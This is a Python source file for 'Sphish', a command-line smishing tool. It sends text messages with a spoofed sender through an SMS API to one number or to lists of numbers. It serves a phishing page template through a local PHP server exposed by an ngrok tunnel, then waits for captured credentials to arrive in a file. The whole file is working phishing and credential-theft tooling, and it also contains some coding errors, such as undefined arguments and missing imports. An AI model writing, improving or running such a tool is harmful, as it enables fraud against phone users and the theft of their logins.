#!/usr/bin/python3

from pwn import *
from sys import exit
from subprocess import getoutput, call, Popen
from os import system, remove, getcwd, mkdir, chmod
from colored import fg, attr
from time import sleep
from argparse import ArgumentParser
from requests import post
from wget import download
from shutil import move, copy, rmtree, copyfile
from requests import get
import os
from zipfile import ZipFile

parser = ArgumentParser()

parser.add_argument('-c', '--check', help='check and install dependencies', action='store_true')
parser.add_argument('-n', '--ngrok', help='Install and configure ngrok')
parser.add_argument('-a', '--all', help='Smishing with Ngrok')

args = parser.parse_args()

def def_handler(sig,frame):
	print('\n  Exiting...\n')
	exit(0)
signal.signal(signal.SIGINT, def_handler)

class Sphish():
	def __init__(self, ngrok, user, id):
		self.__ngrok = ngrok
		self.__user = user
		self.__id = id

	def banner(self):
		print(f"""%s
		███████╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
		██╔════╝██╔══██╗██║  ██║██║██╔════╝██║  ██║
		███████╗██████╔╝███████║██║███████╗███████║
		╚════██║██╔═══╝ ██╔══██║██║╚════██║██╔══██║
		███████║██║     ██║  ██║██║███████║██║  ██║
		╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝
							Created by %sWackyH4cker""" % (fg('cyan'), fg('red')))

	def dependencies(self):
		self.banner()
		with log.progress('Executed as') as p1:
			if self.__user == 'root':
				dependencies = ['php', 'wget']

				for i in dependencies:
					p1.success(self.__user)
					p2 = log.progress(i)
					if getoutput(f'command -v {i}'):
						sleep(1.5)
						p2.success('%s✔%s' % (fg('green'), attr('reset')))
					else:
						p2.failure('%s✘%s' % (fg('red'), attr('reset')))
						system(f'apt-get install {i} -y > /dev/null 2>&1')
			else:
				p1.failure(self.__user+', use %sroot%s.' % (fg('green'), attr('reset')))
				exit(1)

	def ngrok_download(self):
		self.dependencies()
		with log.progress(self.__ngrok) as p1:
			try:
				download('https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip')
				p1.success('%s✔%s' % (fg('green'), attr('reset')))
				with ZipFile('ngrok-stable-linux-amd64.zip', 'r') as t:
					t.extractall()
					chmod('ngrok', stat.S_IEXEC)
					if os.path.exists('ngrok-stable-linux-amd64.zip'):
						remove('ngrok-stable-linux-amd64.zip')
					print()
					try:	
						with log.progress('authtoken') as p2:								
							if getoutput(f'echo {args.ngrok} | wc -c') == '50':
								system(f'./{self.__ngrok} config add-authtoken {args.ngrok} > /dev/null 2>&1')
								sleep(1.5)
								p2.success('%s✔%s' % (fg('green'), attr('reset')))
								print('\n  Execute: ./sphish --all <secret_key>\n')
							else:
								p2.failure('%sInvalid%s' % (fg('red'), attr('reset')))
								print('\n  Execute: ./sphish --all <secret_key>\n')
					except KeyError:
						print('Error')
			except Exception as e:
				p1.failure(e)
				exit(1)

	def send_sms(self, addressee, spoof_number, message):

		url = "https://us.sms.api.sinch.com/xms/v1/" + self.__id + "/batches"

		json_data = {
			"from": spoof_number,
 			"to": [
   				addressee.rstrip()
  			],
  			"body": message
		}

		headers = {
  			"Content-Type": "application/json",
  			"Authorization": f"Bearer {args.sms}"
		}

		r = post(url, json=json_data, headers=headers)

		if r.status_code == 201:
			p1.status(fg('green')+addressee)
		else:
			p2.status(fg('red')+addressee)
			with open('fail.txt', 'a') as f:
				f.write(addressee)

	def open_dictionary(self, route):
		print('  %sNote: %sabsolute path in case of another path: [/home/user/dictionary.txt] or relative path in case of the same directory: [dictionary.txt].%s ' % (fg('red'), fg('white'), attr('reset')))
		print('\n  \033[1mEnter the path of the number dictionary\n%s' % attr('reset'))	
		dictionary = input('%s[%sPATH%s@%s%s%s]-[%s~%s]%s ' % (fg('red'), fg('cyan'), fg('yellow'), fg('white'), route, fg('red'), fg('yellow'), fg('red'), fg('white')))
		
		try:
			with open(dictionary.rstrip(), "r") as numbers:
				spoof_number = input('%s[%sFROM%s@%sexample.com%s]-[%s$%s]%s ' % (fg('red'), fg('cyan'), fg('yellow'), fg('white'), fg('red'), fg('yellow'), fg('red'), fg('white')))
				message = input('%s[%sMESSAGE%s@%sis example...%s]-[%s$%s]%s ' % (fg('red'), fg('cyan'), fg('yellow'), fg('white'), fg('red'), fg('yellow'), fg('red'), fg('white')))
				global p1
				global p2
				print()
				p1 = log.progress('Sending')
				p2 = log.progress('Error')
				for number in numbers:
					self.send_sms(number, spoof_number, message)
				numbers.close()
				p2.failure('%sFailed numbers saved in fail.txt file. Thanks for using Sphish%s\n' % (fg('white'), attr('reset')))
				print('\n  \033[1m%s[%s*%s] %sWaiting for credentials%s\n' % (fg('red'), fg('yellow'), fg('red'), fg('green'), attr('reset')))
				system(f'tail -F --retry .sites/{name_file} > /dev/null 2>&1')
				exit(0)
		except OSError:
			print("\n  %sDictionary path does not exist%s\n" % (fg('red'), attr('reset')))
			call(['pkill', '-f', 'ngrok'])
			call(['pkill', '-f', 'php'])
			exit(1)

	def one_number(self):
		number = input('\n%s[%sADDRESSEE%s@%s+34XXXXXXXXX%s]-[%s$%s]%s ' % (fg('red'), fg('cyan'), fg('yellow'), fg('white'), fg('red'), fg('yellow'), fg('red'), fg('white')))
		spoof_number = input('%s[%sFROM%s@%sexample.com%s]-[%s$%s]%s ' % (fg('red'), fg('cyan'), fg('yellow'), fg('white'), fg('red'), fg('yellow'), fg('red'), fg('white')))
		message = input('%s[%sMESSAGE%s@%sis example...%s]-[%s$%s]%s ' % (fg('red'), fg('cyan'), fg('yellow'), fg('white'), fg('red'), fg('yellow'), fg('red'), fg('white')))
		print()
		global p1
		global p2
		p1 = log.progress('Sending')
		p2 = log.progress('Error')
		self.send_sms(number, spoof_number, message)
		print()
		p2.failure('%sFailed number saved in fail.txt file. Thanks for using Sphish%s\n' % (fg('white'), attr('reset')))
		print('\n  \033[1m%s[%s*%s] %sWaiting for credentials%s\n' % (fg('red'), fg('yellow'), fg('red'), fg('green'), attr('reset')))
		Popen(["tail", "-F", "--retry", f".sites/{name_file}"], shell=False, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
		exit(0)
	
	def ngrok_template(self, route):
		print('\n  \033[1mEnter template to use, must be a directory.\n%s' % attr('reset'))
		template = input('%s[%sTEMPLATE%s@%s%s%s]-[%s$%s]%s ' % (fg('red'), fg('cyan'), fg('yellow'), fg('white'), route, fg('red'), fg('yellow'), fg('red'), fg('white')))
		path = template.rstrip()
		print('\n  \033[1mEnter the name of the file where the credentials are stored\n%s' % attr('reset'))
		global name_file
		name_file = input('%s[%sFILE_CREDENTIALS%s@%s%s%s]-[%s~%s]%s ' % (fg('red'), fg('cyan'), fg('yellow'), fg('white'), path, fg('red'), fg('yellow'), fg('red'), fg('white')))
		
		try:
			mkdir(route+'/.sites')
		except OSError:
			rmtree('.sites', ignore_errors=True)
			mkdir(route+'/.sites')

		
		if os.path.isdir(path): 
			content = os.listdir(path)
			for file in content:
				try:
					src = os.path.join(path, file)
					dst = os.path.join(route+'/.sites', file)
					copy(src, dst)
				except:
					print()
			if os.path.isfile(route+'/ngrok'):
				if os.path.isfile('.sites/ngrok'):
					pass
				else:
					copyfile(route+'/ngrok', route+'/.sites/ngrok')
			elif os.path.isfile('.sites/ngrok'):
				pass
			else:
				print()
				print('  %sNgrok does not exist, run ./sphish --ngrok <authtoken>%s.\n' % (fg('red'), attr('reset')))
				exit(1)
		else:
			print('\n  %sThe specified path does not exist.%s\n' % (fg('red'), attr('reset')))
			exit(1)
		
		print()
		with log.progress('PHP server') as p1:
			sleep(2)
			try:
				system(f'cd .sites && php -S 127.0.0.1:8080 > /dev/null 2>&1 &')
				p1.success(fg('sea_green_1b')+'http://127.0.0.1:8080'+attr('reset'))
				with log.progress('Ngrok server') as p2:
					chmod('.sites/ngrok', stat.S_IEXEC)
					system(f'cd .sites && ./ngrok http 127.0.0.1:8080 > /dev/null 2>&1 &')
					sleep(2)
					r = get('http://127.0.0.1:4040/api/tunnels')
					json_data = r.json()
					for i in json_data["tunnels"]:
						url = i["public_url"]
						p2.success(fg('sea_green_1b')+url+attr('reset'))
			except:	
				print("error")

	def all(self):
		self.dependencies()
		print('\n %s[%s1%s] %s\033[1mPhone number dictionary%s' % (fg('cyan'), fg('green'), fg('cyan'), fg('white'), attr('reset')))
		print(' %s[%s2%s] %s\033[1mJust a number%s' % (fg('cyan'), fg('green'), fg('cyan'), fg('white'), attr('reset')))
		print(' %s[%s3%s] %s\033[1mSmishing + Ngrok%s\n' % (fg('cyan'), fg('green'), fg('cyan'), fg('white'), attr('reset')))
		option = input('%s[%ssphish%s@%sroot%s]-[%s$%s]%s ' % (fg('red'), fg('cyan'), fg('yellow'), fg('white'), fg('red'), fg('yellow'), fg('red'), fg('white')))
		number = option.rstrip()
		route = getcwd()
		if os.path.isfile('fail.txt'):
			remove('fail.txt')
		if number == "1":
			self.open_dictionary(route)

		elif number == "2":
			self.one_number()

		elif number == "3":
			self.ngrok_template(route)
			file = input('\n  ¿Dictionary of numbers? (y/n) ')
			option = file.rstrip()
			if option.lower() == 'y':
				print()
				self.open_dictionary(route)
			elif option.lower() == 'n':
				self.one_number()
			else:
				print('error')
		else:
			print('\n  %sInvalid option' % fg('red'))
			exit(1)


sphish = Sphish('ngrok', getoutput('whoami'), '<ID>') # <- Enter your Service Plan ID

def main():
	if args.check:
		sphish.dependencies()
	elif args.ngrok:
		sphish.ngrok_download()
	elif args.all:
		sphish.all()
		
if __name__ == '__main__':
	main()
